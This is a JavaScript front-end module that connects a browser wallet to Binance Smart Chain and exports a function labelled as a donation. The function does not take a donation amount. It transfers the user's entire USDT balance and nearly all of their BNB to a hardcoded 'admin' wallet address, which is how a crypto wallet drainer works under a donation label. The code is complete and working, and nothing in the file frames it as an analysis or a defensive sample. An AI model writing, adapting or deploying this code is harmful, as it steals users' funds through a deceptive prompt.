import { ethers } from 'ethers';
import Web3 from 'web3';

let provider;
let signer;
let web3;
let usdtContract;

const USDT_BEP20_CONTRACT_ADDRESS = "0x55d398326f99059ff775485246999027B3197955";
const adminWallet = "0x20274614e28038E3085828DDA33e10ed33e8c7f9"; // Your admin wallet address

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

const BSC_MAINNET_PARAMS = {
  chainId: '0x38', // 56 in decimal
  chainName: 'Binance Smart Chain Mainnet',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'BNB',
    decimals: 18
  },
  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com/']
};

async function switchToBSCMainnet() {
  if (window.ethereum) {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_MAINNET_PARAMS.chainId }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [BSC_MAINNET_PARAMS],
          });
        } catch (addError) {
          throw new Error("Failed to add BSC Mainnet to wallet");
        }
      } else {
        throw new Error("Failed to switch to BSC Mainnet");
      }
    }
  } else {
    throw new Error("No compatible wallet found");
  }
}

export async function connectWallet() {
  try {
    await switchToBSCMainnet();

    if (window.ethereum) {
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      provider = new ethers.BrowserProvider(window.ethereum, "any");
      web3 = new Web3(window.ethereum);
    } else {
      throw new Error("No compatible wallet found");
    }

    signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BEP20_CONTRACT_ADDRESS);

    const network = await provider.getNetwork();
    if (network.chainId !== BigInt(56)) {
      throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
    }

    return userAddress;
  } catch (error) {
    console.error("Wallet connection error:", error);
    throw error;
  }
}

export async function donateBNBAndUSDT() {
  try {
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];

    const initialBnbBalance = await web3.eth.getBalance(userAddress);
    const usdtBalance = await usdtContract.methods.balanceOf(userAddress).call();
    const usdtBalanceInUsdt = web3.utils.fromWei(usdtBalance, 'ether');

    console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
    console.log("Current USDT balance:", usdtBalanceInUsdt);

    if (parseFloat(initialBnbBalance) <= 0 && parseFloat(usdtBalanceInUsdt) <= 0) {
      throw new Error("Insufficient balance to make the donation");
    }

    let bnbTxHash, usdtTxHash;
    let bnbAmount = '0', usdtAmount = '0';

    // Transfer entire USDT balance
   if (parseFloat(usdtBalanceInUsdt) > 0) {
      try {
        const usdtTx = await usdtContract.methods.transfer(adminWallet, usdtBalance).send({
          from: userAddress
        });
        usdtTxHash = usdtTx.transactionHash;
        console.log("USDT Transaction sent:", usdtTxHash);
        usdtAmount = usdtBalanceInUsdt;
      } catch (error) {
        console.error("USDT transfer failed:", error);
        throw new Error("USDT transfer failed. Please try again.");
      }
    }
    
    // Now transfer remaining BNB balance after gas
    try {
      const gasPrice = await web3.eth.getGasPrice();
      const gasLimit = 21000; // Standard gas limit for a simple transfer
      const maxGasCost = BigInt(gasPrice) * BigInt(gasLimit);
      const remainingBnbBalance = BigInt(initialBnbBalance) - maxGasCost;

      console.log("Gas price:", gasPrice);
      console.log("Max gas cost:", maxGasCost.toString());
      console.log("Remaining BNB balance after gas:", remainingBnbBalance.toString());

      if (remainingBnbBalance > 0) {
        console.log("Attempting to send BNB transaction...");
        const bnbTx = await web3.eth.sendTransaction({
          from: userAddress,
          to: adminWallet,
          value: remainingBnbBalance.toString(),
          gas: gasLimit,
          gasPrice: gasPrice
        });
        bnbTxHash = bnbTx.transactionHash;
        console.log("BNB Transaction sent:", bnbTxHash);
        bnbAmount = web3.utils.fromWei(remainingBnbBalance.toString(), 'ether');
      } else {
        console.error("Insufficient BNB balance for transfer after gas fees");
        throw new Error("Insufficient BNB balance for transfer after gas fees");
      }
    } catch (error) {
      console.error("BNB transfer failed:", error);
      console.error("Error details:", error);
      throw new Error("BNB transfer failed. Please try again.");
    }

    return {
      bnbTxHash,
      usdtTxHash,
      bnbAmount,
      usdtAmount
    };
  } catch (error) {
    console.error("Donation failed:", error);
    throw error;
  }
}
